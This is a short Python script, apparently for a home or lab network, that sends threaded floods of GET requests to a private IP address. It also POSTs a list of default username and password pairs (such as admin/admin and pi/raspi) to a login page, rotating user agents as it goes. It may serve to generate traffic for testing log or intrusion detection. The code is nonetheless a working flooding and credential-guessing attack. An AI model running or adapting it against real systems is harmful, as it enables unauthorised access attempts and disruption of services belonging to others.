import requests
import time
from datetime import datetime
import random
import threading
from concurrent.futures import ThreadPoolExecutor

TARGET = "192.168.100.2"
PORT = 80
URL = f"http://{TARGET}:{PORT}"

paths = [
    "/welcome",
    "/about",
    "/login",
    "/index.html",
    "/robots.txt",
    "/adminpage"
]

userAgents = [
    "Mozilla/5.0",
    "curl/7.68.0",
    "python-requests/2.31.0",
    "wget/1.21"
]

creds = [
    ("admin","admin"),
    ("root", "pass"),
    ("user", "guest123"),
    ("guest", "password123"),
    ("pi", "raspi"),
    ("test","test123")
]

def getReq(path,userAgent, attemptNum):
    try:
        timestamp = datetime.now().strftime('%H:%M:%S')
        headers = {'User-Agent': userAgent}
        print(f"[{timestamp}] Attempt #{attemptNum}: GET {URL + path}")
        response = requests.get(URL+path, headers=headers) 
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {response.status_code}; check log")
        return True
    except Exception as e:
        print("failed")
        return False

def postReq(path,userAgent,username,password,attemptNum):
    try:
        timestamp = datetime.now().strftime('%H:%M:%S')
        headers = {'User-Agent': userAgent}
        data = {'username':username, 'password': password}
        print(f"[{timestamp}] Attempt #{attemptNum}: POST {URL + path} ({username}:{password})")
        response = requests.post(URL + path, data=data, headers=headers)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {response.status_code}; check log")
        return True
    except Exception as e:
        print("failed")
        return False
        

def getWorker(attemptNum):
    path = paths[random.randint(0,5)]
    ua = userAgents[random.randint(0,3)]
    getReq(path,ua,attemptNum)

def postWorker(attemptNum):
    ua = userAgents[random.randint(0,3)]
    uname,passwd = creds[random.randint(0,5)]
    postReq("/index.html",ua,uname,passwd,attemptNum)

def main():
    attempts = 100
    threads = 10
    a = input("p or g?")
    if(a=="get"):
        print("get flood")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(getWorker,i+1) for i in range(attempts)]
            for f in futures:
                try:
                    f.result()  
                except Exception as e:
                    print("failed")
    elif(a=="post"):
        print("post flood")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(postWorker,i+1) for i in range(attempts)]
            for f in futures:
                try:
                    f.result()  
                except Exception as e:
                    print("failed")
    else:
        return 



if __name__ == "__main__":
    main()
